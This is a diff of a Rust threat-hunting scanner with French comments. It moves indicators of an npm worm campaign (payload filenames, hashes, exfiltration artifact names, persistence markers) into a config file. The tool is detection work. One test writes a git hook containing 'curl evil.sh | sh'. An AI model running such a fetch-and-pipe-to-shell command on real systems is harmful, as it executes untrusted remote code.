@@ -1,8 +1,9 @@
 //! Recherche active de signaux malveillants connus sur le disque (SPEC-F06/F07).
 //!
-//! Ces listes évoluent vite avec les campagnes ; elles sont volontairement regroupées
-//! ici pour être externalisables plus tard vers un fichier de config (`iocs.toml`)
-//! sans toucher au reste du moteur de Threat Hunting.
+//! Les listes de fichiers/hashes/marqueurs suspects sont externalisées vers
+//! `iocs.toml` (`crate::iocs`, SPEC-F08) : toutes les fonctions de ce module
+//! reçoivent la configuration résolue (`IocsConfig`) en paramètre plutôt que de lire
+//! des constantes en dur.
 
 use std::path::{Path, PathBuf};
 
@@ -11,69 +12,7 @@ use sha2::{Digest, Sha256};
 use tracing::debug;
 
 use crate::discovery::Project;
-
-/// Fichiers de charge utile connus, recherchés à la racine du workspace et des projets.
-pub const SUSPICIOUS_FILENAMES: &[&str] = &[
-    "setup.mjs",
-    "Math_Symbol.js",
-    "setup_bun.js",
-    "bun_environment.js",
-    // SPEC-F08 (CHAINDROP, compromission keyv) : math_init.js est le même payload que
-    // Math_Symbol.js (même hash SHA-256, nom différent selon le vecteur de propagation).
-    "math_init.js",
-    "bundle.js",
-    // SPEC-F08 : emplacements réels de persistance Claude Code / VS Code — pas
-    // seulement `<racine>/setup.mjs`, jusqu'ici absents du scan (trou de couverture).
-    ".claude/setup.mjs",
-    ".vscode/setup.mjs",
-    ".dev-utils/server.js",
-];
-
-/// Empreintes SHA-256 connues des charges du ver (SPEC-F08, source : Elastic Security
-/// Labs). Le nom de fichier change selon le vecteur de propagation mais le contenu —
-/// donc le hash — reste identique : une correspondance ici est une confirmation
-/// directe, plus fiable qu'une simple correspondance de nom.
-pub const KNOWN_MALICIOUS_FILE_HASHES: &[(&str, &str)] = &[
-    (
-        "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc",
-        "Math_Symbol.js / math_init.js (CHAINDROP)",
-    ),
-    (
-        "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb",
-        "setup.mjs (CHAINDROP)",
-    ),
-    (
-        "54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668",
-        "setup.mjs, variante (CHAINDROP)",
-    ),
-];
-
-/// Chaîne recherchée dans les hooks de `<pkg_dir>/node_modules/*/package.json`.
-pub const SUSPICIOUS_HOOK_MARKER: &str = "setup.mjs";
-
-/// Chaîne recherchée dans les LaunchAgents macOS (`~/Library/LaunchAgents/`).
-pub const SUSPICIOUS_LAUNCH_AGENT_MARKER: &str = "gh-token-monitor";
-
-/// Fichiers d'exfiltration générés localement par la vague "Second Coming" (SPEC-F07).
-pub const EXFIL_ARTIFACT_FILENAMES: &[&str] = &[
-    "cloud.json",
-    "contents.json",
-    "environment.json",
-    "truffleSecrets.json",
-    "actionsSecrets.json",
-    "data.json",
-];
-
-/// Noms de workflows GitHub Actions malveillants connus, injectés dans `.github/workflows/`.
-pub const SUSPICIOUS_WORKFLOW_FILENAMES: &[&str] = &["shai-hulud-workflow.yml", "discussion.yaml"];
-
-/// Dossier de cache caché utilisé pour dissimuler un binaire TruffleHog détourné.
-pub const SUSPICIOUS_CACHE_DIRNAME: &str = ".truffler-cache";
-
-/// Répertoire de template git par défaut (SPEC-F08) utilisé quand `init.templateDir`
-/// n'est pas explicitement configuré : vérifié tel quel pour des hooks laissés en
-/// place même si la configuration a depuis été effacée.
-pub const DEFAULT_GIT_TEMPLATE_DIRNAME: &str = ".git-templates";
+use crate::iocs::{IocsConfig, KnownFileHash};
 
 /// Catégorie d'un signal de compromission détecté sur le disque.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
@@ -126,28 +65,29 @@ pub struct ThreatSignal {
 }
 
 /// Exécute l'ensemble des vérifications de Threat Hunting (SPEC-F06/F07) sur le
-/// workspace et chaque projet Node.js identifié.
-pub fn hunt(workspace_root: &Path, projects: &[Project]) -> Vec<ThreatSignal> {
+/// workspace et chaque projet Node.js identifié, selon les signatures de `config`
+/// (`iocs.toml`, SPEC-F08).
+pub fn hunt(workspace_root: &Path, projects: &[Project], config: &IocsConfig) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
 
-    signals.extend(scan_root(workspace_root));
-    signals.extend(scan_github_workflows(workspace_root));
+    signals.extend(scan_root(workspace_root, config));
+    signals.extend(scan_github_workflows(workspace_root, config));
 
     for project in projects {
-        signals.extend(scan_root(&project.root));
-        signals.extend(scan_github_workflows(&project.root));
-        signals.extend(scan_node_modules_hooks(&project.root));
+        signals.extend(scan_root(&project.root, config));
+        signals.extend(scan_github_workflows(&project.root, config));
+        signals.extend(scan_node_modules_hooks(&project.root, config));
     }
 
     signals.extend(scan_root_for_known_files(
         &std::env::temp_dir(),
-        EXFIL_ARTIFACT_FILENAMES,
+        &config.exfil_artifact_filenames,
         ThreatCategory::ExfilArtifact,
     ));
-    signals.extend(scan_macos_launch_agents());
+    signals.extend(scan_macos_launch_agents(config));
     signals.extend(scan_claude_user_config());
-    signals.extend(scan_git_hook_persistence());
-    signals.extend(scan_npmrc_secrets());
+    signals.extend(scan_git_hook_persistence(config));
+    signals.extend(scan_npmrc_secrets(config));
     signals.extend(scan_git_remote_credentials(workspace_root));
 
     signals.sort_by(|a, b| a.path.cmp(&b.path));
@@ -164,31 +104,34 @@ pub fn hunt(workspace_root: &Path, projects: &[Project]) -> Vec<ThreatSignal> {
     signals
 }
 
-fn scan_root(root: &Path) -> Vec<ThreatSignal> {
-    let mut signals = scan_suspicious_files(root);
+fn scan_root(root: &Path, config: &IocsConfig) -> Vec<ThreatSignal> {
+    let mut signals = scan_suspicious_files(root, config);
     signals.extend(scan_root_for_known_files(
         root,
-        EXFIL_ARTIFACT_FILENAMES,
+        &config.exfil_artifact_filenames,
         ThreatCategory::ExfilArtifact,
     ));
-    signals.extend(scan_cache_dir(root));
-    signals.extend(scan_vscode_tasks(root));
+    signals.extend(scan_cache_dir(root, config));
+    signals.extend(scan_vscode_tasks(root, config));
     signals.extend(scan_claude_settings(root));
     signals
 }
 
 /// Vérifie `.vscode/tasks.json` pour une tâche `folderOpen` malveillante déclenchant
-/// le payload `setup.mjs` à l'ouverture du dossier dans VS Code (SPEC-F08).
-fn scan_vscode_tasks(root: &Path) -> Option<ThreatSignal> {
+/// un payload connu (`suspicious_hook_markers`) à l'ouverture du dossier dans VS Code
+/// (SPEC-F08).
+fn scan_vscode_tasks(root: &Path, config: &IocsConfig) -> Option<ThreatSignal> {
     let path = root.join(".vscode").join("tasks.json");
     let content = std::fs::read_to_string(&path).ok()?;
-    content
-        .contains(SUSPICIOUS_HOOK_MARKER)
-        .then(|| ThreatSignal {
-            category: ThreatCategory::SuspiciousHook,
-            detail: format!("tâche VS Code suspecte détectée ({SUSPICIOUS_HOOK_MARKER})"),
-            path,
-        })
+    let marker = config
+        .suspicious_hook_markers
+        .iter()
+        .find(|marker| content.contains(marker.as_str()))?;
+    Some(ThreatSignal {
+        category: ThreatCategory::SuspiciousHook,
+        detail: format!("tâche VS Code suspecte détectée ({marker})"),
+        path,
+    })
 }
 
 /// Vérifie `.claude/settings.json` (racine du workspace ou d'un projet) pour la
@@ -217,26 +160,38 @@ fn scan_mcp_servers_config(path: &Path) -> Option<ThreatSignal> {
     })
 }
 
-/// Recherche les fichiers de charge utile connus (`SUSPICIOUS_FILENAMES`) et vérifie
-/// leur empreinte SHA-256 contre `KNOWN_MALICIOUS_FILE_HASHES` (SPEC-F08) : une
-/// correspondance de hash est une confirmation directe (`ConfirmedMaliciousFile`),
-/// sinon la correspondance de nom seule reste un indice (`SuspiciousFile`).
-fn scan_suspicious_files(root: &Path) -> Vec<ThreatSignal> {
-    scan_suspicious_files_against(root, KNOWN_MALICIOUS_FILE_HASHES)
+/// Recherche les fichiers de charge utile connus (`config.suspicious_filenames`) et
+/// vérifie leur empreinte SHA-256 contre `config.known_malicious_file_hashes`
+/// (SPEC-F08) : une correspondance de hash est une confirmation directe
+/// (`ConfirmedMaliciousFile`), sinon la correspondance de nom seule reste un indice
+/// (`SuspiciousFile`).
+fn scan_suspicious_files(root: &Path, config: &IocsConfig) -> Vec<ThreatSignal> {
+    scan_suspicious_files_against(
+        root,
+        &config.suspicious_filenames,
+        &config.known_malicious_file_hashes,
+    )
 }
 
-fn scan_suspicious_files_against(root: &Path, known_hashes: &[(&str, &str)]) -> Vec<ThreatSignal> {
-    SUSPICIOUS_FILENAMES
+fn scan_suspicious_files_against(
+    root: &Path,
+    filenames: &[String],
+    known_hashes: &[KnownFileHash],
+) -> Vec<ThreatSignal> {
+    filenames
         .iter()
         .map(|name| root.join(name))
         .filter(|path| path.is_file())
         .map(|path| {
             let matched_hash = sha256_hex(&path)
-                .and_then(|hash| known_hashes.iter().find(|(known, _)| *known == hash));
+                .and_then(|hash| known_hashes.iter().find(|entry| entry.hash == hash));
             match matched_hash {
-                Some((hash, label)) => ThreatSignal {
+                Some(entry) => ThreatSignal {
                     category: ThreatCategory::ConfirmedMaliciousFile,
-                    detail: format!("empreinte SHA-256 confirmée ({label}) : {hash}"),
+                    detail: format!(
+                        "empreinte SHA-256 confirmée ({}) : {}",
+                        entry.label, entry.hash
+                    ),
                     path,
                 },
                 None => ThreatSignal {
@@ -260,7 +215,7 @@ fn sha256_hex(path: &Path) -> Option<String> {
 
 fn scan_root_for_known_files(
     root: &Path,
-    filenames: &[&str],
+    filenames: &[String],
     category: ThreatCategory,
 ) -> Vec<ThreatSignal> {
     filenames
@@ -275,13 +230,18 @@ fn scan_root_for_known_files(
         .collect()
 }
 
-fn scan_cache_dir(root: &Path) -> Option<ThreatSignal> {
-    let path = root.join(SUSPICIOUS_CACHE_DIRNAME);
-    path.is_dir().then(|| ThreatSignal {
-        detail: format!("dossier de cache suspect connu : {}", path.display()),
-        category: ThreatCategory::SuspiciousCacheDir,
-        path,
-    })
+fn scan_cache_dir(root: &Path, config: &IocsConfig) -> Vec<ThreatSignal> {
+    config
+        .suspicious_cache_dirnames
+        .iter()
+        .map(|dirname| root.join(dirname))
+        .filter(|path| path.is_dir())
+        .map(|path| ThreatSignal {
+            detail: format!("dossier de cache suspect connu : {}", path.display()),
+            category: ThreatCategory::SuspiciousCacheDir,
+            path,
+        })
+        .collect()
 }
 
 /// Énumère les `package.json` du premier niveau de `<project_root>/node_modules`
@@ -319,10 +279,10 @@ fn installed_package_manifests(project_root: &Path) -> Vec<PathBuf> {
 }
 
 /// Vérifie les hooks de `<pkg_dir>/node_modules/*/package.json` (SPEC-F06).
-fn scan_node_modules_hooks(project_root: &Path) -> Vec<ThreatSignal> {
+fn scan_node_modules_hooks(project_root: &Path, config: &IocsConfig) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
     for manifest in installed_package_manifests(project_root) {
-        check_hook_file(&manifest, &mut signals);
+        check_hook_file(&manifest, &config.suspicious_hook_markers, &mut signals);
     }
     signals
 }
@@ -382,20 +342,24 @@ fn extract_install_scripts(package_json: &Path) -> Vec<InstallScript> {
     .collect()
 }
 
-fn check_hook_file(package_json: &Path, signals: &mut Vec<ThreatSignal>) {
+fn check_hook_file(package_json: &Path, hook_markers: &[String], signals: &mut Vec<ThreatSignal>) {
     let Ok(content) = std::fs::read_to_string(package_json) else {
         return;
     };
-    if content.contains(SUSPICIOUS_HOOK_MARKER) {
-        signals.push(ThreatSignal {
-            category: ThreatCategory::SuspiciousHook,
-            detail: format!("hook suspect détecté ({SUSPICIOUS_HOOK_MARKER})"),
-            path: package_json.to_path_buf(),
-        });
-    }
+    let Some(marker) = hook_markers
+        .iter()
+        .find(|marker| content.contains(marker.as_str()))
+    else {
+        return;
+    };
+    signals.push(ThreatSignal {
+        category: ThreatCategory::SuspiciousHook,
+        detail: format!("hook suspect détecté ({marker})"),
+        path: package_json.to_path_buf(),
+    });
 }
 
-fn scan_github_workflows(root: &Path) -> Vec<ThreatSignal> {
+fn scan_github_workflows(root: &Path, config: &IocsConfig) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
     let Ok(entries) = std::fs::read_dir(root.join(".github").join("workflows")) else {
         return signals;
@@ -403,7 +367,12 @@ fn scan_github_workflows(root: &Path) -> Vec<ThreatSignal> {
 
     for entry in entries.flatten() {
         let file_name = entry.file_name();
-        if SUSPICIOUS_WORKFLOW_FILENAMES.contains(&file_name.to_string_lossy().as_ref()) {
+        let file_name = file_name.to_string_lossy();
+        if config
+            .suspicious_workflow_filenames
+            .iter()
+            .any(|known| known == file_name.as_ref())
+        {
             signals.push(ThreatSignal {
                 category: ThreatCategory::SuspiciousWorkflow,
                 detail: "nom de workflow GitHub Actions malveillant connu".to_string(),
@@ -416,9 +385,12 @@ fn scan_github_workflows(root: &Path) -> Vec<ThreatSignal> {
 }
 
 /// Recherche un LaunchAgent macOS suspect dans `~/Library/LaunchAgents/` (SPEC-F06).
-pub fn scan_macos_launch_agents() -> Vec<ThreatSignal> {
+pub fn scan_macos_launch_agents(config: &IocsConfig) -> Vec<ThreatSignal> {
     match dirs::home_dir() {
-        Some(home) => scan_launch_agents_dir(&home.join("Library").join("LaunchAgents")),
+        Some(home) => scan_launch_agents_dir(
+            &home.join("Library").join("LaunchAgents"),
+            &config.suspicious_launch_agent_markers,
+        ),
         None => Vec::new(),
     }
 }
@@ -427,14 +399,17 @@ pub fn scan_macos_launch_agents() -> Vec<ThreatSignal> {
 /// répertoire de hooks résultant (SPEC-F08) : tout `git init`/`git clone` copie ce
 /// répertoire dans `.git/hooks/` du nouveau dépôt, assurant une réinfection
 /// automatique à chaque nouveau dépôt créé ou cloné.
-pub fn scan_git_hook_persistence() -> Vec<ThreatSignal> {
+pub fn scan_git_hook_persistence(config: &IocsConfig) -> Vec<ThreatSignal> {
     match dirs::home_dir() {
-        Some(home) => scan_git_hook_persistence_at(&home),
+        Some(home) => scan_git_hook_persistence_at(&home, &config.default_git_template_dirnames),
         None => Vec::new(),
     }
 }
 
-fn scan_git_hook_persistence_at(home: &Path) -> Vec<ThreatSignal> {
+fn scan_git_hook_persistence_at(
+    home: &Path,
+    default_template_dirnames: &[String],
+) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
 
     let gitconfig_path = home.join(".gitconfig");
@@ -452,14 +427,23 @@ fn scan_git_hook_persistence_at(home: &Path) -> Vec<ThreatSignal> {
         });
     }
 
-    let template_dir = match &configured_dir {
-        Some(dir) => match dir.strip_prefix("~/") {
-            Some(rest) => home.join(rest),
-            None => PathBuf::from(dir),
-        },
-        None => home.join(DEFAULT_GIT_TEMPLATE_DIRNAME),
-    };
-    signals.extend(scan_git_template_hooks_dir(&template_dir));
+    match &configured_dir {
+        Some(dir) => {
+            let template_dir = match dir.strip_prefix("~/") {
+                Some(rest) => home.join(rest),
+                None => PathBuf::from(dir),
+            };
+            signals.extend(scan_git_template_hooks_dir(&template_dir));
+        }
+        // Pas de config explicite : vérifier chaque emplacement par défaut connu
+        // (SPEC-F08) — des hooks peuvent y avoir été laissés même si la
+        // configuration `init.templateDir` a depuis été effacée.
+        None => {
+            for dirname in default_template_dirnames {
+                signals.extend(scan_git_template_hooks_dir(&home.join(dirname)));
+            }
+        }
+    }
 
     signals
 }
@@ -509,20 +493,17 @@ fn scan_git_template_hooks_dir(template_dir: &Path) -> Vec<ThreatSignal> {
         .collect()
 }
 
-/// Clés `.npmrc` porteuses d'un jeton d'authentification (SPEC-F08).
-const NPMRC_SECRET_KEYS: &[&str] = &["_authToken", "_password", "_auth"];
-
 /// Vérifie `~/.npmrc` (SPEC-F08) pour un jeton d'authentification npm en clair. Les
 /// valeurs interpolées via `${VAR}` restent sûres (résolues depuis l'environnement,
 /// jamais commises en clair) et ne sont pas signalées.
-pub fn scan_npmrc_secrets() -> Vec<ThreatSignal> {
+pub fn scan_npmrc_secrets(config: &IocsConfig) -> Vec<ThreatSignal> {
     match dirs::home_dir() {
-        Some(home) => scan_npmrc_secrets_at(&home.join(".npmrc")),
+        Some(home) => scan_npmrc_secrets_at(&home.join(".npmrc"), &config.npmrc_secret_keys),
         None => Vec::new(),
     }
 }
 
-fn scan_npmrc_secrets_at(path: &Path) -> Vec<ThreatSignal> {
+fn scan_npmrc_secrets_at(path: &Path, secret_keys: &[String]) -> Vec<ThreatSignal> {
     let Ok(content) = std::fs::read_to_string(path) else {
         return Vec::new();
     };
@@ -540,9 +521,9 @@ fn scan_npmrc_secrets_at(path: &Path) -> Vec<ThreatSignal> {
             if value.is_empty() || value.starts_with("${") {
                 return None;
             }
-            NPMRC_SECRET_KEYS
+            secret_keys
                 .iter()
-                .any(|marker| key.ends_with(marker))
+                .any(|marker| key.ends_with(marker.as_str()))
                 .then(|| ThreatSignal {
                     category: ThreatCategory::ExposedSecret,
                     detail: format!("jeton en clair détecté dans .npmrc ({key})"),
@@ -647,7 +628,7 @@ fn http_remote_with_exposed_credentials(url: &str) -> Option<String> {
     Some(format!("http://***@{host_and_path}"))
 }
 
-fn scan_launch_agents_dir(dir: &Path) -> Vec<ThreatSignal> {
+fn scan_launch_agents_dir(dir: &Path, markers: &[String]) -> Vec<ThreatSignal> {
     let mut signals = Vec::new();
     let Ok(entries) = std::fs::read_dir(dir) else {
         return signals;
@@ -658,10 +639,13 @@ fn scan_launch_agents_dir(dir: &Path) -> Vec<ThreatSignal> {
         let Ok(content) = std::fs::read_to_string(&path) else {
             continue;
         };
-        if content.contains(SUSPICIOUS_LAUNCH_AGENT_MARKER) {
+        if let Some(marker) = markers
+            .iter()
+            .find(|marker| content.contains(marker.as_str()))
+        {
             signals.push(ThreatSignal {
                 category: ThreatCategory::LaunchAgent,
-                detail: format!("LaunchAgent suspect ({SUSPICIOUS_LAUNCH_AGENT_MARKER})"),
+                detail: format!("LaunchAgent suspect ({marker})"),
                 path,
             });
         }
@@ -674,13 +658,18 @@ fn scan_launch_agents_dir(dir: &Path) -> Vec<ThreatSignal> {
 mod tests {
     use super::*;
 
+    fn default_config() -> IocsConfig {
+        crate::iocs::load(None).unwrap()
+    }
+
     #[test]
     fn detects_known_suspicious_files_at_root() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("setup.mjs"), "").unwrap();
         std::fs::write(dir.path().join("harmless.js"), "").unwrap();
 
-        let signals = scan_root(dir.path());
+        let signals = scan_root(dir.path(), &config);
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::SuspiciousFile);
         assert!(signals[0].path.ends_with("setup.mjs"));
@@ -688,6 +677,7 @@ mod tests {
 
     #[test]
     fn confirms_a_known_malicious_file_via_sha256_hash() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("setup.mjs"), b"malicious payload content").unwrap();
 
@@ -695,9 +685,13 @@ mod tests {
             .iter()
             .map(|byte| format!("{byte:02x}"))
             .collect();
-        let known_hashes = [(hash.as_str(), "charge de test")];
+        let known_hashes = [KnownFileHash {
+            hash,
+            label: "charge de test".to_string(),
+        }];
 
-        let signals = scan_suspicious_files_against(dir.path(), &known_hashes);
+        let signals =
+            scan_suspicious_files_against(dir.path(), &config.suspicious_filenames, &known_hashes);
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::ConfirmedMaliciousFile);
         assert!(signals[0].detail.contains("charge de test"));
@@ -705,14 +699,16 @@ mod tests {
 
     #[test]
     fn name_match_without_hash_match_stays_a_plain_suspicious_file() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("setup.mjs"), b"contenu inoffensif").unwrap();
 
-        let known_hashes = [(
-            "0000000000000000000000000000000000000000000000000000000000000000",
-            "inconnu",
-        )];
-        let signals = scan_suspicious_files_against(dir.path(), &known_hashes);
+        let known_hashes = [KnownFileHash {
+            hash: "0000000000000000000000000000000000000000000000000000000000000000".to_string(),
+            label: "inconnu".to_string(),
+        }];
+        let signals =
+            scan_suspicious_files_against(dir.path(), &config.suspicious_filenames, &known_hashes);
 
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::SuspiciousFile);
@@ -720,6 +716,7 @@ mod tests {
 
     #[test]
     fn detects_claude_and_vscode_persistence_payloads() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(dir.path().join(".claude")).unwrap();
         std::fs::write(dir.path().join(".claude").join("setup.mjs"), "").unwrap();
@@ -728,7 +725,7 @@ mod tests {
         std::fs::create_dir_all(dir.path().join(".dev-utils")).unwrap();
         std::fs::write(dir.path().join(".dev-utils").join("server.js"), "").unwrap();
 
-        let signals = scan_root(dir.path());
+        let signals = scan_root(dir.path(), &config);
         assert_eq!(signals.len(), 3);
         assert!(signals
             .iter()
@@ -743,6 +740,7 @@ mod tests {
 
     #[test]
     fn detects_a_malicious_vscode_folder_open_task() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let vscode = dir.path().join(".vscode");
         std::fs::create_dir_all(&vscode).unwrap();
@@ -752,13 +750,14 @@ mod tests {
         )
         .unwrap();
 
-        let signals = scan_vscode_tasks(dir.path());
+        let signals = scan_vscode_tasks(dir.path(), &config);
         assert!(signals.is_some());
         assert_eq!(signals.unwrap().category, ThreatCategory::SuspiciousHook);
     }
 
     #[test]
     fn ignores_a_clean_vscode_tasks_file() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let vscode = dir.path().join(".vscode");
         std::fs::create_dir_all(&vscode).unwrap();
@@ -768,7 +767,7 @@ mod tests {
         )
         .unwrap();
 
-        assert!(scan_vscode_tasks(dir.path()).is_none());
+        assert!(scan_vscode_tasks(dir.path(), &config).is_none());
     }
 
     #[test]
@@ -810,11 +809,12 @@ mod tests {
 
     #[test]
     fn detects_exfil_artifacts_and_cache_dir_at_root() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("cloud.json"), "{}").unwrap();
-        std::fs::create_dir(dir.path().join(SUSPICIOUS_CACHE_DIRNAME)).unwrap();
+        std::fs::create_dir(dir.path().join(&config.suspicious_cache_dirnames[0])).unwrap();
 
-        let signals = scan_root(dir.path());
+        let signals = scan_root(dir.path(), &config);
         assert!(signals
             .iter()
             .any(|s| s.category == ThreatCategory::ExfilArtifact));
@@ -825,6 +825,7 @@ mod tests {
 
     #[test]
     fn detects_suspicious_hook_in_node_modules_including_scoped_packages() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let pkg_dir = dir.path().join("node_modules").join("evil-pkg");
         std::fs::create_dir_all(&pkg_dir).unwrap();
@@ -850,7 +851,7 @@ mod tests {
         std::fs::create_dir_all(&clean_dir).unwrap();
         std::fs::write(clean_dir.join("package.json"), r#"{"name":"safe-pkg"}"#).unwrap();
 
-        let signals = scan_node_modules_hooks(dir.path());
+        let signals = scan_node_modules_hooks(dir.path(), &config);
         assert_eq!(signals.len(), 2);
         assert!(signals
             .iter()
@@ -859,19 +860,21 @@ mod tests {
 
     #[test]
     fn detects_malicious_github_workflow() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let workflows = dir.path().join(".github").join("workflows");
         std::fs::create_dir_all(&workflows).unwrap();
         std::fs::write(workflows.join("shai-hulud-workflow.yml"), "").unwrap();
         std::fs::write(workflows.join("ci.yml"), "").unwrap();
 
-        let signals = scan_github_workflows(dir.path());
+        let signals = scan_github_workflows(dir.path(), &config);
         assert_eq!(signals.len(), 1);
         assert!(signals[0].path.ends_with("shai-hulud-workflow.yml"));
     }
 
     #[test]
     fn detects_suspicious_launch_agent() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(
             dir.path().join("com.suspicious.agent.plist"),
@@ -880,13 +883,14 @@ mod tests {
         .unwrap();
         std::fs::write(dir.path().join("com.safe.agent.plist"), "harmless").unwrap();
 
-        let signals = scan_launch_agents_dir(dir.path());
+        let signals = scan_launch_agents_dir(dir.path(), &config.suspicious_launch_agent_markers);
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::LaunchAgent);
     }
 
     #[test]
     fn detects_hijacked_init_template_dir_and_flags_gitconfig() {
+        let config = default_config();
         let home = tempfile::tempdir().unwrap();
         std::fs::write(
             home.path().join(".gitconfig"),
@@ -897,7 +901,8 @@ mod tests {
         std::fs::create_dir_all(&hooks_dir).unwrap();
         std::fs::write(hooks_dir.join("pre-commit"), "#!/bin/sh\ncurl evil.sh | sh").unwrap();
 
-        let signals = scan_git_hook_persistence_at(home.path());
+        let signals =
+            scan_git_hook_persistence_at(home.path(), &config.default_git_template_dirnames);
 
         assert_eq!(signals.len(), 2);
         assert!(signals
@@ -909,12 +914,17 @@ mod tests {
 
     #[test]
     fn detects_hooks_left_in_default_git_templates_dir_without_config_override() {
+        let config = default_config();
         let home = tempfile::tempdir().unwrap();
-        let hooks_dir = home.path().join(DEFAULT_GIT_TEMPLATE_DIRNAME).join("hooks");
+        let hooks_dir = home
+            .path()
+            .join(&config.default_git_template_dirnames[0])
+            .join("hooks");
         std::fs::create_dir_all(&hooks_dir).unwrap();
         std::fs::write(hooks_dir.join("post-checkout"), "malicious").unwrap();
 
-        let signals = scan_git_hook_persistence_at(home.path());
+        let signals =
+            scan_git_hook_persistence_at(home.path(), &config.default_git_template_dirnames);
 
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::GitHookPersistence);
@@ -923,6 +933,7 @@ mod tests {
 
     #[test]
     fn ignores_a_gitconfig_without_hijacked_template_dir() {
+        let config = default_config();
         let home = tempfile::tempdir().unwrap();
         std::fs::write(
             home.path().join(".gitconfig"),
@@ -930,11 +941,15 @@ mod tests {
         )
         .unwrap();
 
-        assert!(scan_git_hook_persistence_at(home.path()).is_empty());
+        assert!(
+            scan_git_hook_persistence_at(home.path(), &config.default_git_template_dirnames)
+                .is_empty()
+        );
     }
 
     #[test]
     fn detects_a_literal_auth_token_in_npmrc() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join(".npmrc");
         std::fs::write(
@@ -943,31 +958,34 @@ mod tests {
         )
         .unwrap();
 
-        let signals = scan_npmrc_secrets_at(&path);
+        let signals = scan_npmrc_secrets_at(&path, &config.npmrc_secret_keys);
         assert_eq!(signals.len(), 1);
         assert_eq!(signals[0].category, ThreatCategory::ExposedSecret);
     }
 
     #[test]
     fn ignores_an_env_interpolated_npmrc_token() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join(".npmrc");
         std::fs::write(&path, "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n").unwrap();
 
-        assert!(scan_npmrc_secrets_at(&path).is_empty());
+        assert!(scan_npmrc_secrets_at(&path, &config.npmrc_secret_keys).is_empty());
     }
 
     #[test]
     fn ignores_an_npmrc_without_auth_keys() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join(".npmrc");
         std::fs::write(&path, "registry=https://registry.npmjs.org/\n").unwrap();
 
-        assert!(scan_npmrc_secrets_at(&path).is_empty());
+        assert!(scan_npmrc_secrets_at(&path, &config.npmrc_secret_keys).is_empty());
     }
 
     #[test]
     fn hunt_deduplicates_signals_shared_by_workspace_root_and_project_root() {
+        let config = default_config();
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("setup.mjs"), "").unwrap();
         let projects = vec![Project {
@@ -976,7 +994,7 @@ mod tests {
             has_yarn_lock: false,
         }];
 
-        let signals = hunt(dir.path(), &projects);
+        let signals = hunt(dir.path(), &projects, &config);
         assert_eq!(
             signals
                 .iter()
